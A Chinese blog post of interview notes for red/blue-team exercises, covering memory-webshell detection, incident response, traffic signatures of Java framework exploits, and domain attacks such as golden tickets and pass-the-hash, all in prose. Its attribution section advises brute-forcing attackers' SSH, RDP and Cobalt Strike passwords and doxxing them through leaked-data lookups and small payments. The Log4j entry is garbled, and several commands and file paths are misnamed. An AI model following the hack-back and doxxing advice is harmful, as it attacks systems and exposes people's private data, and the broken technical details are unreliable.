+<h3 id="内存马检测与排查"><a href="#内存马检测与排查" class="headerlink" title="内存马检测与排查"></a>内存马检测与排查</h3><h4 id="源码检测"><a href="#源码检测" class="headerlink" title="源码检测"></a>源码检测</h4><p>在java中，只有被JVM加载后的类才能被调用，或者在需要时通过反射通知JVM加载。所以特征都在内存中，表现形式为被加载的class。需要通过某种方法获取到JVM的运行时内存中已加载的类， Java本身提供了Instrumentation类来实现运行时注入代码并执行，因此产生一个检测思路：注入jar包-&gt; dump已加载class字节码-&gt;反编译成java代码-&gt; 源码webshell检测。</p>
+<p>这样检测比较消耗性能，我们可以缩小需要进行源码检测的类的范围，通过如下的筛选条件组合使用筛选类进行检测：</p>
+<p>①新增的或修改的；</p>
+<p>②没有对应class文件的</p>
+<p>③xml配置中没注册的</p>
+<p>④冰蝎等常见工具使用的</p>
+<p>⑤filterchain中排第一的filter类</p>
+<p>还有一些比较弱的特征可以用来辅助检测，比如类名称中包含shell或者为随机名，使用不常见的classloader加载的类等等。</p>
+<p>另外，有一些工具可以辅助检测内存马，如java-memshell-scanner是通过jsp扫描应用中所有的filter和servlet，然后通过名称、对应的class是否存在来判断是否是内存马</p>
+<h4 id="内存马排查"><a href="#内存马排查" class="headerlink" title="内存马排查"></a>内存马排查</h4><p>如果我们通过检测工具或者其他手段发现了一些内存webshell的痕迹，需要有一个排查的思路来进行跟踪分析，也是根据各类型的原理，列出一个排查思路。</p>
+<p>如果是jsp注入，日志中排查可疑jsp的访问请求。</p>
+<p>如果是代码执行漏洞，排查中间件的error.log，查看是否有可疑的报错，判断注入时间和方法</p>
+<p>根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。</p>
+<p>如果是servlet或者spring的controller类型，根据上报的webshell的url查找日志（日志可能被关闭，不一定有），根据url最早访问时间确定被注入时间。</p>
+<p>如果是filter或者listener类型，可能会有较多的404但是带有参数的请求，或者大量请求不同url但带有相同的参数，或者页面并不存在但返回200</p>
+<h2 id="实际HW应急"><a href="#实际HW应急" class="headerlink" title="实际HW应急"></a>实际HW应急</h2><p>1.你本人应急的案例</p>
+<p>我拿个之前的应急排查来说吧，就是我们这边接到通知他们公司几台服务器有问题，让我们去检测。然后看到是windows的机子，本地用户和组排查的时候发现新建可疑的用户，确定主机是有问题的，对方已经拿到主机权限,然后事件管理器有大量的登录日志爆破，采取的措施是直接删除可疑的和隐藏账号,排查登录日志,确定系统账号已经不安全,更新了管理员账号,对启动项和可疑进程做了清除,取了一份样本拿去分析,通告上级紧急修补web站点的漏洞.</p>
+<p>2.你本人溯源的思路</p>
+<p>红队攻击都会挂着代理，你溯源的话只能溯源到他的代理ip，没有太大的意义，如果说服务器被上了内存马的情况，可以去工具取样他内存马的ip，对内存马ip反向扫描端口，</p>
+<p>因为他们也是通过远程进去的，去爆破他们的ssh,3389和cs的密码。</p>
+<p>反序列化的取样，他打shiro，里面就有他的基本设备vps，通过中间件吧这些有特征的ip收集，放到在线情报平台上识别，检测是不是有ip绑定域名的，通过whois反查他的域名注册时间、邮箱，通过社工库查他的手机号，然后通过社交软件，qq、微信、支付宝来给他转一毛钱，拼接他的个人信息。</p>
+<p>3.已经被上传webshell应急</p>
+<p>系统如果已经被植入后门，说明攻击者已经攻击成功，而且拿到权限，这时候日志信息可能提供不了帮助，首先要去考虑系统的账户是否安全，，又没口令爆破成功的痕迹，排查账号的密码是否已经不安全.</p>
+<p>(Linux)的话看计划任务,没有定时反弹shell,还有就是进程是不是可疑在通信.发现可疑问题,就要样本分析.</p>
+<p>(windows)的话就看启动项和进程.</p>
+<p>如果是web入侵,看日志web服务是不是安全?还原攻击的流程.</p>
+<p>4.流量溯源</p>
+<p>先看日志，看攻击时间做一个审计，搜索这个时间文件上传的操作，一般是GET和POST两种，GET的话可以直接看到他请求的资源、地址和content，然后webshell该杀就杀，后门改补就补，如果是POST，那么就看不到请求的内容，可以去防火墙上下载完整数据包来分析。</p>
+<p>漏洞</p>
+<p>1.log4j</p>
+<p>Log4j就是java的日志插件，处理日志存在”KaTeX parse error: Expected ‘}’, got ‘EOF’ at end of input: …入，流量特点就是数据包里面有”{“字段。</p>
+<p>2.Shiro</p>
+<p>1.2.4 key是写在源码里的，找到key就能构造攻击链，1.2.4之后的775key是随机生成的，但我们还可以构造cookie，尝试构造攻击链。</p>
+<p>Shiro流量特征:数据包含有多个$$$符号，C参数含有base64编码。</p>
+<p>3.Fastjson</p>
+<p>原理也是jdni注入 利用就是构造一个json字符，用@type指定一个类库，流量特征就是json autotype</p>
+<p>4.Weblogic</p>
+<p>xml的反序列化漏洞，通过xmldecoder还是什么导致的xml解析代码执行。弱口令。</p>
+<p>流量特征:不加密，常见的出网协议也可以用。有很多T3协议的特征，文件操作和冰蝎一样有fileoutstream字段。</p>
+<h3 id="命令："><a href="#命令：" class="headerlink" title="命令："></a>命令：</h3><p>计划任务的命令和目录</p>
+<p>Kuntab命令排查计时任务，位置在&#x2F;var&#x2F;spool&#x2F;cron 参数r和e就可以删除和编辑</p>
+<p>&#x2F;etc&#x2F;cron</p>
+<p>开机启动项&#x2F;etc&#x2F;rd.local文件</p>
+<p>进程和端口命令</p>
+<p>进程的话有ps命令，任务管理器 参数au列进程，x是吧其他用户的进程也列出来。</p>
+<p>端口的话有netstat，常见配合grep命令和p参数筛选有问题的进程，</p>
+<p>Windows下载文件命令</p>
+<p>证书命令certutil、上传下载监控bitamin 还有powershell。</p>
+<p>他要问参数的话，就是下载常数都是固定的，比较长</p>
+<p>第一次简述</p>
+<p>windows应急排查</p>
+<p>初步排查:</p>
+<p>1.系统账号排查(通过本地用户组去可疑账号、隐藏账号，有的话就删除掉)</p>
+<p>2.事件管理器检测登陆日志,用微软的Log parser导出后分析</p>
+<p>3.可疑端口，建立的链接，排查他对应的进程，用微软的msinfo32查看进程的路径和签名是否可疑。</p>
+<p>后门排查:（权限维持:一个进程杀掉了，过段时间重新派生）</p>
+<p>Linux机子应急排查</p>
+<p>1.和windows应急思路相同，登录账号检测</p>
+<p>2.后门排查(检测定时任务、开机启动项、异常端口(比如建立的可疑连接)，进程排查)</p>
+<p>update留意系统运行到现在登录多久、多少用户。</p>
+<p>1.影子账户，&#x2F;etc&#x2F;shadow因为&#x2F;etc&#x2F;passwd任何用户都可以访问，密码信息就分离到shadow,shadow文件只有root权限才能访问，如果说，stat命令发现，shodow文件权限变化了，这检测就有问题。</p>
+<p>Ssh公钥，linux的机子22端口基本都是开的，如果写公钥进去，就是明显的后门</p>
+<p>域</p>
+<p>谈提权和查杀</p>
+<p>安全加固</p>
+<p>主要是对接入服务器ip的方式限制，还有一个是密码策略，(就是如果服务器被拿到shell和留下后门，这时候不是去考虑日志的问题，要去重点注意当前用户的密码是否安全)</p>
+<p>守护进程: linux的后台进程，但他是root命令运行的，比如&#x2F;var&#x2F;log&#x2F;boot.log</p>
+<p>权限维持查杀: 看他做了什么服务，删除配置文件就行</p>
+<p>Webshell检测工具:D盾、河马、百度webdir</p>
+<p>免杀的可疑行为:</p>
+<p>比较常见的有操作注册表、操作powershell、还有操作用户(比如添加用户、删除用户)、操作敏感文件。</p>
+<h3 id="杀软的识别"><a href="#杀软的识别" class="headerlink" title="杀软的识别"></a>杀软的识别</h3><p>常见的静态、还有行为检测的，还有之前用到的云查杀。</p>
+<p>如果他问你怎么实现:我知道的有代码混淆、花指令借助mssf</p>
+<h3 id="谈票据"><a href="#谈票据" class="headerlink" title="谈票据"></a>谈票据</h3><p>如果面试问你一个问题，黄金票据怎么拿域管?</p>
+<p>知识：Kerberos认证(krb)</p>
+<p>域管krbtgt的hash</p>
+<h4 id="0-是否存在域-1"><a href="#0-是否存在域-1" class="headerlink" title="0.是否存在域"></a>0.是否存在域</h4><p>Ipconfig&#x2F;all systeminfo 还有net config workastion看工作站</p>
+<h4 id="1-域控的权限维持-1"><a href="#1-域控的权限维持-1" class="headerlink" title="1.域控的权限维持"></a>1.域控的权限维持</h4><p>第一次拿到域管后，第二次的域渗透只需要域管的hash就可以做成票据，拿域管的权限。</p>
+<p>或者还有ske-key的万能密码，我知道他的原理是注入lsass进程。不需要域管密码和hash。用域用户身份也可以登录。</p>
+<h4 id="2-常用的横向手法-1"><a href="#2-常用的横向手法-1" class="headerlink" title="2.常用的横向手法"></a>2.常用的横向手法</h4><p>1.ptk(密钥)</p>
+<p>2.pth（通过hash，就是用minikatz做pth的横向）</p>
+<h4 id="3-域里面的常用漏洞"><a href="#3-域里面的常用漏洞" class="headerlink" title="3.域里面的常用漏洞"></a>3.域里面的常用漏洞</h4><p>Ms14-068 吧域内用户获得域管权限。</p>
+<h4 id="4-白银票据"><a href="#4-白银票据" class="headerlink" title="4.白银票据"></a>4.白银票据</h4><p>和黄金票据差别是他不是域控加密的，是服务器本身的ntlm加密。</p>
+<h3 id="很重要的几部分"><a href="#很重要的几部分" class="headerlink" title="很重要的几部分"></a>很重要的几部分</h3><h4 id="1-邮件服务器EXchange"><a href="#1-邮件服务器EXchange" class="headerlink" title="1.邮件服务器EXchange"></a>1.邮件服务器EXchange</h4><p>域控DC的sync,minikatz的插件，可以导出域内全部用户的hash。</p>
+<h4 id="谈ssrf"><a href="#谈ssrf" class="headerlink" title="谈ssrf"></a>谈ssrf</h4><p>服务器加载外部资源没对目的地址做过滤，只有有网址的地方都可能有ssrf。</p>
+<p>常用协议有gopher（沟fe） dist file http https</p>
+<p>初步的探测可以通过file协议读取本机文件，探测本机的网段。</p>
+<p>Dist协议探测端口</p>
+<h4 id="怎么通过ssrf拿shell-1"><a href="#怎么通过ssrf拿shell-1" class="headerlink" title="怎么通过ssrf拿shell?"></a>怎么通过ssrf拿shell?</h4><p>可以借助gopher协议探测内网的web服务sql注入，直接在url后面拼接内网的地址，后面加上sql注入语句就行。</p>
+<p>修复:从根源入手(限制资源的地址)、禁用不必要的协议</p>
+<h4 id="Csrf"><a href="#Csrf" class="headerlink" title="Csrf"></a>Csrf</h4><p>1.登录了某个网站，有cookie，2.点开他的url链接</p>
+<h3 id="谈网络基础"><a href="#谈网络基础" class="headerlink" title="谈网络基础"></a>谈网络基础</h3><p>网络基础</p>
+<p>打内网大部分流量都走socks协议，有防火墙过不去</p>
+<p>Regeorg(瑞joju)和代理链 都是socks协议的代理。</p>
+<p>Socks协议走的是tcp，不支持icmp，所以不能ping。</p>
+<p>正向代理：客户端代理 服务器不知道客户端的真实ip。</p>
+<p>反向代理: 服务端代理 客户端是不知道服务器的真实地址。</p>
+<p>路由表:这就是设备流量通过数据包的传输路径，比如一些业务系统入口是内网地址，做了访问控制，就需要加一条路由表。</p>
+<p>http的两个状态 无状态和无连接，处理完请求就断开，不会记录客户端的任何信息。</p>
+<p>NOSQL数据库: mongo(27017) redis 6379</p>
+<p>跨域，说下jsonp和cors (跨域) 就是访问其他域名，端口不同或者域名不同都算跨域，jsonp协议数据包是json格式，cors允许跨域加载的资源。</p>
+<p>越权的修复: 给用户添加token值，做逻辑判断先去判断token值再走业务流程。</p>
+<p>钓鱼邮件的识别: 邮件附带连接，链接需要输入账号密码、文件格式exe或者文档。</p>
+<p>遇到.exe文件如何处理？主要是看exe是不是钓鱼还是远控，拿去杀软沙箱分析和微步样本分析。</p>
+<p>Awk和sad，awk配合uniq用来做日志筛选的，sad是删除文件中的指定字符。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://chr1sto4f.github.io">0000FF</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://chr1sto4f.github.io/2023/02/12/hvv%E9%9D%A2%E7%BB%8F/">https://chr1sto4f.github.io/2023/02/12/hvv%E9%9D%A2%E7%BB%8F/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://chr1sto4f.github.io" target="_blank">0000FF's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BB%8F%E9%AA%8C/">经验</a></div><div class="post_share"><div class="social-share" data-image="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/8080d89c2ceb3204.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/02/04/DerpNStink-1/"><img class="next-cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/3.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">DerpNStink-1</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/0000ff.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">0000FF</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Chr1sTo4F"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Chr1sTo4F" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:Chr1sTo4F@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">考研一战成硕</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/02/12/hvv%E9%9D%A2%E7%BB%8F/" title="hvv面经"><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/8080d89c2ceb3204.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hvv面经"/></a><div class="content"><a class="title" href="/2023/02/12/hvv%E9%9D%A2%E7%BB%8F/" title="hvv面经">hvv面经</a><time datetime="2023-02-12T06:37:08.000Z" title="发表于 2023-02-12 14:37:08">2023-02-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/02/04/DerpNStink-1/" title="DerpNStink-1"><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DerpNStink-1"/></a><div class="content"><a class="title" href="/2023/02/04/DerpNStink-1/" title="DerpNStink-1">DerpNStink-1</a><time datetime="2023-02-04T06:47:32.000Z" title="发表于 2023-02-04 14:47:32">2023-02-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/01/30/Windows%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86and%E5%9F%9F%E6%B8%97%E9%80%8F%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/" title="Windows提权漏洞合集and域渗透历史漏洞整理"><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/R-C.ebb9668b3a30bc070e108ec0341097bd.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Windows提权漏洞合集and域渗透历史漏洞整理"/></a><div class="content"><a class="title" href="/2023/01/30/Windows%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86and%E5%9F%9F%E6%B8%97%E9%80%8F%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/" title="Windows提权漏洞合集and域渗透历史漏洞整理">Windows提权漏洞合集and域渗透历史漏洞整理</a><time datetime="2023-01-30T04:27:55.000Z" title="发表于 2023-01-30 12:27:55">2023-01-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/01/27/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="微信小程序信息收集"><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/t01db9bc29a66401694.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="微信小程序信息收集"/></a><div class="content"><a class="title" href="/2023/01/27/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="微信小程序信息收集">微信小程序信息收集</a><time datetime="2023-01-27T06:06:28.000Z" title="发表于 2023-01-27 14:06:28">2023-01-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/01/26/Lord-Of-The-Root-1-0-1/" title="Lord Of The Root-1.0.1"><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/9e759a9e6d036079ae79df3d8c914976.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Lord Of The Root-1.0.1"/></a><div class="content"><a class="title" href="/2023/01/26/Lord-Of-The-Root-1-0-1/" title="Lord Of The Root-1.0.1">Lord Of The Root-1.0.1</a><time datetime="2023-01-26T09:58:02.000Z" title="发表于 2023-01-26 17:58:02">2023-01-26</time></div></div></div></div></div></div></main><footer id="footer" style="background: linear-gradient(20deg, #0062be, #925696, #ccc426e, #fb0347)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By 0000FF</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
